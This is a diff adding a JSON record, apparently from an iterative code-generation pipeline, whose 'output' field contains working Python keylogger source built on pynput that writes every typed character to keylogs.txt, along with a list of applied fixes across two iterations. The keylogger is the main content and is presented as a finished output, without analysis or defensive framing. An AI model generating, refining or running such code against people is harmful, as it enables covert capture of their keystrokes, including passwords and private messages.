@@ -1,0 +1,12 @@
+{
+  "output": "from pynput.keyboard import Listener, Key\n\ndef on_press(key):\n    with open('keylogs.txt', 'a') as f:\n        if hasattr(key, 'char'):\n            f.write(key.char)\n        elif key == Key.enter:\n            f.write('[ENTER]')\n        elif key == Key.space:\n            f.write('[SPACE]')\n        elif key == Key.esc:\n            return False\n\nwith Listener(on_press=on_press) as listener:\n    listener.join()",
+  "notes": "",
+  "applied_fixes": [
+    "iteration1_issue1",
+    "iteration1_issue2",
+    "iteration1_issue3",
+    "iteration1_issue4",
+    "iteration1_issue5"
+  ],
+  "iterations": 2
+}
